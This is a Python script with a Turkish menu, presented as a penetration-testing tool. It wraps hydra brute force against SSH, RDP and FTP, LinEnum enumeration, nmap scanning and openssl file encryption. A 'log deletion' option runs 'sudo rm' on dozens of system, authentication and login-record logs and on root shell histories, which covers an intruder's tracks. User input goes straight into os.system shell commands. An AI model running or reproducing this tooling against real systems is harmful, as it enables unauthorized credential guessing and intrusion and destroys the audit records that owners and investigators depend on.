#python3
#/bin/bash
import os
import time
import getpass

def kadi_wrdlst_kont(kontrol_edilecek):	
	if os.path.isfile(kontrol_edilecek)==False:
		print("")
		print("Wordlist Bulunamadı!")
		print("")
		while os.path.isfile(kontrol_edilecek)==False:
			kontrol_edilecek=input("Kullanıcı Wordlist Yolu: ")
			if os.path.isfile(kontrol_edilecek)==True:
				break

def sifre_wrdlst_kont(kontrol_edilecek):
	if os.path.isfile(kontrol_edilecek)==False:
		print("")
		print("Wordlist Bulunamadı!")
		print("")
		while os.path.isfile(kontrol_edilecek)==False:
			kontrol_edilecek=input("Şifre Wordlist Yolu: ")
			if os.path.isfile(kontrol_edilecek)==True:
				break

def ip_analiz():
	print("")
	ip=input("Ip Adresi: ")
	while ip=="" or "." not in ip:
		print("")
		print("Ip girilmedi")
		print("")
		ip=input("Ip Adresi: ")
		if ip==True:
			break
	print("")
	print("Analiz Ediliyor....")
	print("")
	time.sleep(2)
	os.system("curl https://ipapi.co/"+ip+"/json")

def ssh_brute():
	ip=input("Ip Adresi:")
	print("")
	print("1-)Kullanıcı Wordlist")
	print("2-)Tek Kullanıcı Adı")
	print("99-)Geri Dön")
	print("")
	kadi_secim=input("Seçim: ")
	if kadi_secim=="99":
		giris_ekranı()
	if kadi_secim=="1":
		kadi_wrdlst=input("Kullanıcı Wordlist Yolu: ")
		kadi_wrdlst_kont(kadi_wrdlst)
		sifre_wrdlst=input("Şifre Wordlist Yolu: ")
		sifre_wrdlst_kont(sifre_wrdlst)
		print("")
		print("Brute Force Başlıyor...")
		print("")
		time.sleep(2)
		os.system("hydra -L "+kadi_wrdlst+" -P "+sifre_wrdlst+" ssh://"+ip+" -vV")
	
	if kadi_secim=="2":
		kadi=input("Kullanıcı Adı: ")
		sifre_wrdlst=input("Şifre Wordlist Yolu: ")
		sifre_wrdlst_kont(sifre_wrdlst)
		print("")
		print("Brute Force Başlıyor....")
		time.sleep(2)
		os.system("hydra -l "+kadi+" -P "+sifre_wrdlst+" ssh://"+ip+" -vV")

def rdp_brute():
	ip=input("Ip Adresi:")
	print("")
	print("1-)Kullanıcı Wordlist")
	print("2-)Tek Kullanıcı Adı")
	print("99-)Geri Dön")
	print("")
	kadi_secim=input("Seçim: ")
	if kadi_secim=="99":
		giris_ekranı()
	if kadi_secim=="1":
		kadi_wrdlst=input("Kullanıcı Wordlist Yolu: ")
		kadi_wrdlst_kont(kadi_wrdlst)
		sifre_wrdlst=input("Şifre Wordlist Yolu: ")
		sifre_wrdlst_kont(sifre_wrdlst)
		print("")
		print("Brute Force Başlıyor...")
		print("")
		time.sleep(2)
		os.system("hydra -L "+kadi_wrdlst+" -P "+sifre_wrdlst+" rdp://"+ip+" -vV")
	
	if kadi_secim=="2":
		kadi=input("Kullanıcı Adı: ")
		sifre_wrdlst=input("Şifre Wordlist Yolu: ")
		sifre_wrdlst_kont(sifre_wrdlst)
		print("")
		print("Brute Force Başlıyor....")
		time.sleep(2)
		os.system("hydra -l "+kadi+" -P "+sifre_wrdlst+" rdp://"+ip+" -vV")	

def ftp_brute():
	ip=input("Ip Adresi:")
	print("")
	print("1-)Kullanıcı Wordlist")
	print("2-)Tek Kullanıcı Adı")
	print("99-)Geri Dön")
	print("")
	kadi_secim=input("Seçim: ")
	if kadi_secim=="99":
		giris_ekranı()
	if kadi_secim=="1":
		kadi_wrdlst=input("Kullanıcı Wordlist Yolu: ")
		kadi_wrdlst_kont(kadi_wrdlst)
		sifre_wrdlst=input("Şifre Wordlist Yolu: ")
		sifre_wrdlst_kont(sifre_wrdlst)
		print("")
		print("Brute Force Başlıyor...")
		print("")
		time.sleep(2)
		os.system("hydra -L "+kadi_wrdlst+" -P "+sifre_wrdlst+" ftp://"+ip+" -vV")
	
	if kadi_secim=="2":
		kadi=input("Kullanıcı Adı: ")
		sifre_wrdlst=input("Şifre Wordlist Yolu: ")
		sifre_wrdlst_kont(sifre_wrdlst)
		print("")
		print("Brute Force Başlıyor....")
		time.sleep(2)
		os.system("hydra -l "+kadi+" -P "+sifre_wrdlst+" ftp://"+ip+" -vV")	

def enum():
	print("")
	print("Enumeration İşlemi Başlıyor...")
	print("")
	time.sleep(2)
	os.system("bash LinEnum.sh")

def log_silme():
	print("")
	dosyalar=["/var/log/lastlog", 
            "/var/log/messages", 
            "/var/log/warn", 
            "/var/log/wtmp", 
            "/var/log/poplog", 
            "/var/log/qmail", 
            "/var/log/smtpd", 
            "/var/log/telnetd", 
            "/var/log/secure", 
            "/var/log/auth", 
            "/var/log/auth.log", 
            "/var/log/cups/access_log", 
            "/var/log/kern.log",
            "/var/log/cups/error_log", 
            "/var/log/thttpd_log", 
            "/var/log/spooler", 
            "/var/spool/tmp", 
            "/var/spool/errors", 
            "/var/spool/locks", 
            "/var/log/nctfpd.errs", 
            "/var/log/acct", 
            "/var/log/apache2/*", 
            "/var/log/apache2/*", 
            "/usr/local/apache/*", 
            "/usr/local/apache/*", 
            "/usr/local/www/logs/thttpd_log", 
            "/var/log/news", 
            "/var/log/news/news", 
            "/var/log/news.all", 
            "/var/log/news/news.all", 
            "/var/log/news/news.crit", 
            "/var/log/news/news.err", 
            "/var/log/news/news.notice", 
            "/var/log/news/suck.err", 
            "/var/log/news/suck.notice", 
            "/var/log/xferlog", 
            "/var/log/proftpd/xferlog.legacy", 
            "/var/log/proftpd.xferlog", 
            "/var/log/proftpd.access_log", 
            "/var/log/httpd/error_log", 
            "/var/log/httpsd/ssl_log", 
            "/var/log/httpsd/ssl.access_log", 
            "/var/adm", 
            "/var/run/utmp", 
            "/etc/wtmp", 
            "/etc/utmp", 
            "/etc/mail/access", 
            "/var/log/mail/info.log", 
            "/var/log/mail/errors.log", 
            "/var/log/httpd/*_log", 
            "/var/log/ncftpd/misclog.txt", 
            "/var/account/pacct", 
            "/var/log/snort", 
            "/var/log/bandwidth", 
            "/var/log/explanations", 
            "/var/log/syslog", 
            "/var/log/user.log", 
            "/var/log/daemons/info.log", 
            "/var/log/daemons/warnings.log", 
            "/var/log/daemons/errors.log", 
            "/etc/httpd/logs/error_log", 
            "/etc/httpd/logs/*_log", 
            "/var/log/mysqld/mysqld.log"
            "/root/.ksh_history", 
            "/root/.bash_history",
            "/home/kaan/.bash_history", 
            "/root/.sh_history", 
            "/root/.history", 
            "/root/*_history", 
            "/root/.login", 
            "/root/.logout", 
            "/root/.bash_logut", 
            "/root/.Xauthority"]

	for dosya in dosyalar:
		if os.path.isfile(dosya):
			os.system("sudo rm "+dosya)
			print("Silindi--------> "+dosya)
	print("")
	print("Tamamlandı")
	print("")

def detaylı_tarama():
	print("")
	ip=input("Ip Adresi: ")
	if ip=="":
		exit("\n"+"Ip Adresi Girilmedi!"+"\n")
	print("")
	print("İşlem Başlıyor.....")
	print("")
	time.sleep(2)
	os.system("nmap -p- -sV -sC --min-rate 1000 --max-retries 5 "+ip)
	print("")

def sifreleme():
	print("")
	dosya=input("Şifrelenecek Dosya: ")
	while dosya=="" or os.path.isfile(dosya)==False:
		print("")
		print("Dosya Bulunamadı!")
		print("")
		dosya=input("Şifrelenecek Dosya:")
		if os.path.isfile(dosya)==True:
			break

	sifre=getpass.getpass("Şifre: ")
	while sifre==False or sifre=="":
		print("")
		print("Şifre Girilmedi!")
		print("")
		sifre=getpass.getpass("Şifre: ")
		if sifre==True:
			break

	print("")
	print("Şifreleniyor......")
	time.sleep(2)
	os.system("openssl enc -aes-256-cbc -in "+dosya+" -out "+dosya+".enc "+"-k "+sifre)
	cevap=input("Orjinal Dosya Silinsin mi? (E/H): ")
	if cevap=="E" or cevap=="e":
		os.remove(dosya)	
	print("")
	print("Şifrelenen Dosya-----> "+dosya)
	print("Çıktı ---------> "+dosya+".enc")
	print("")


def islem_devam():
	print("")
	print("")
	print("Uygulamadan Çıkılsın Mı ? (E/H): ")
	print("")
	secim=input("Seçim: ")
	if secim=="E" or secim=="e":
		exit()
	elif secim=="H" or secim=="h":
		giris_ekranı()

def giris_ekranı():
	os.system("clear")
	print("""
---------------------------------------------
    

            KernelKel Pentest Aracı

                       
---------------------------------------------

1-)Ip Analiz
2-)Brute Force
3-)Linux Enumeration
4-)Log Silme
5-)Detaylı Port Tarama
6-)Dosya Şifreleme

7-)Çıkış
""")

	secim=input("Seçim: ")

	while int(secim)>7 or not secim or int(secim)<1:
		print("")
		print("Geçersiz Seçim")
		print("")
		secim=input("Seçim: ")
		if int(secim)<7 and int(secim)>1 and secim:
			break
		else:
			continue


	if secim=="1":
		ip_analiz()
		islem_devam()
	if secim=="2":
		print("")
		print("1-)Ssh")
		print("2-)Rdp")
		print("3-)Ftp")
		print("99-)Geri Dön")
		print("")
		brute_secim=input("Seçim: ")
		if brute_secim=="1":
			ssh_brute()
			islem_devam()
		if brute_secim=="2":
			rdp_brute()
			islem_devam()
		if brute_secim=="3":
			ftp_brute()
			islem_devam()
		if brute_secim=="99":
			giris_ekranı()
			islem_devam()
	if secim=="3":
		enum()
		islem_devam()
	if secim=="4":
		log_silme()
		islem_devam()
	if secim=="5":
		detaylı_tarama()
		islem_devam()
	if secim=="6":
		sifreleme()
		islem_devam()
	if secim=="7":
		exit()

giris_ekranı()
